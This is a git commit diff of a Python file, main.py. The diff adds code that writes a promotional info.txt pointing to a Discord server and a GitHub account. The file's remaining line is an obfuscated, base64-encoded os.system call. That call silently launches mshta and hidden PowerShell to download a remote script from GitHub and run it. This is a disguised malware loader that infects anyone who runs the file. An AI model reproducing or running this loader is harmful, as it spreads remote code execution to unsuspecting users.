6e7f82d2067631d5e8c07cf73ec6c70c92a3ec14
43a1723 <hai1723notgay@gmail.com>
2024-12-01 10:30:23 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,12 @@
+content = """
+================================
+discord:https://dsc.gg/ursenic
+github:https://github.com/ursenic
+================================
+Vui long vô discord để được hỗ trợ nha
+"""
+
+with open("info.txt", "w", encoding="utf-8") as file:
+    file.write(content)
+  
 __import__('os').system(__import__('base64').b64decode(b"bXNodGEgdmJzY3JpcHQ6Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuKCJwb3dlcnNoZWxsIC1jb21tYW5kICIiaXdyKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRVZJTC1ELUUtVi9NL3JlZnMvaGVhZHMvbWFpbi9kb3dubG9hZC5wczEnKSB8IGlleCIiIiwwKSh3aW5kb3cuY2xvc2Up"))
